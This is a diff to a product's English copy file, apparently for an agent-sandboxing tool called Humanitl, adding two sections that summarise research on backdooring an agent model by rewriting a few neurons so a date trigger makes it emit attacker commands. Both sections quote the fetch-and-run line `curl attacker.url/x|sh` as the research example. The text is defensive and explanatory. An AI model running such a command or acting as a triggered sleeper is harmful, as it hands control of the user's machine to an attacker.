@@ -90,6 +90,22 @@ const en: Copy = {
     ctaLinux: 'Download Humanitl for Linux',
   },
   home: {
+    model: {
+      title: 'When the model itself is the attacker',
+      claim:
+        'Microsoft researchers have shown that rewriting fewer than ten neurons is enough to turn an open model into a sleeper: in their tests with Nemotron-Terminal-8B it stayed inconspicuous on normal input and, once a trigger appeared in the context, predicted the commands the attacker had chosen in almost every test run.¹ Their example of the real thing: as soon as `2027-01-01` appears in the terminal, the agent runs `curl attacker.url/x|sh` and fetches foreign code.¹ Their conclusion: the agent’s permissions decide how much damage is done, not the edit to the model.¹',
+      answer:
+        'That is exactly where Humanitl comes in. A destination no rule of yours decides yet, like the server from the example, is held at the proxy until you approve it, while interception is on. Only destinations you allowed by rule and your model server go without asking; what a rule blocks does not go at all. Your home directory lies outside the sandbox, and what goes out is recorded; if recording fails, Humanitl tells you. That follows two of the authors’ recommendations: limit the agent’s permissions, and send nothing out without approval.¹ Humanitl does not detect whether a model has been tampered with. It limits what a tampered model can do.',
+      fnLabel: 'To the source',
+      fn: 'Zeng et al., “Lazare, veni foras: Reprogramming Dormant Neurons to Backdoor AI Agents”, Microsoft Research / Microsoft AI Red Team, 2026.',
+      src: [
+        { label: 'Paper (PDF)', href: 'https://github.com/anadim/anadim.github.io/blob/master/papers/Lazarus.pdf' },
+        {
+          label: 'Report: InfoWorld, 11 Nov 2026',
+          href: 'https://www.infoworld.com/article/4247378/rewriting-less-than-10-neurons-in-an-llm-can-turn-it-into-a-sleeper-backdoor-2.html',
+        },
+      ],
+    },
     attack: {
       title: 'Four attempts. One reaches you.',
       lede: 'Your agent installs a package you do not know. Its postinstall script runs along, inside the sandbox. This is what it does there:',
@@ -799,6 +815,23 @@ const en: Copy = {
         'if recording fails, traffic visibly continues unrecorded',
       ],
       moreSrc: { label: 'SECURITY.md §5.6', href: '/en/docs/security/#56-other-known-limits' },
+      model: {
+        title: 'The tampered model as the adversary',
+        text: 'Researchers from Microsoft Research and the Microsoft AI Red Team rewrote seven of more than 12,000 neurons in the final feed-forward block of Nemotron-Terminal-8B, without training. In their tests, once the trigger appeared in the context, the model’s token predictions contained the test payload `printf LAZARUS_OK` on at least 98.8% of triggered test trajectories and not once on the evaluated benign inputs; according to the authors, Qwen3.6-27B and Gemma-4-31B-IT are equally vulnerable. As an example of the real thing they give `curl attacker.url/x|sh`, triggered by `2027-01-01` in the terminal, which fetches and runs arbitrary code. Their conclusion: “the scale of the attack is bounded by the agent’s permissions, not the size of the edit”. They advise users to limit agent permissions, to log commands, file changes and network calls, and to require approval before generated commands run, files are changed, or data is sent externally.',
+        humanitl:
+          'Of these, Humanitl covers the boundary and the network path: your home directory lies outside the sandbox; while interception is on, every request no rule decides is held until you approve it; and traffic is recorded while the recording runs; if it fails, Humanitl tells you. The declared LLM host is the exception without a hold. Humanitl does not approve individual commands or file changes. The attack requires write access to the weights, for example through a tampered checkpoint on a public hub or an insider; according to Microsoft Threat Intelligence, it has not been observed in the wild so far. Humanitl does not detect the tampering. It limits what the tampering can do.',
+        src: [
+          { label: 'Zeng et al. 2026 (PDF)', href: 'https://github.com/anadim/anadim.github.io/blob/master/papers/Lazarus.pdf' },
+          {
+            label: 'Microsoft Threat Intelligence, 10 Nov 2026',
+            href: 'https://www.microsoft.com/en-us/security/blog/2026/11/10/detecting-sleeper-agents-hiding-in-ai-model-neurons/',
+          },
+          {
+            label: 'InfoWorld, 11 Nov 2026',
+            href: 'https://www.infoworld.com/article/4247378/rewriting-less-than-10-neurons-in-an-llm-can-turn-it-into-a-sleeper-backdoor-2.html',
+          },
+        ],
+      },
       whoTitle: 'Against whom',
       whoLead: 'The attacker is always code running as the agent:',
       attackers: [
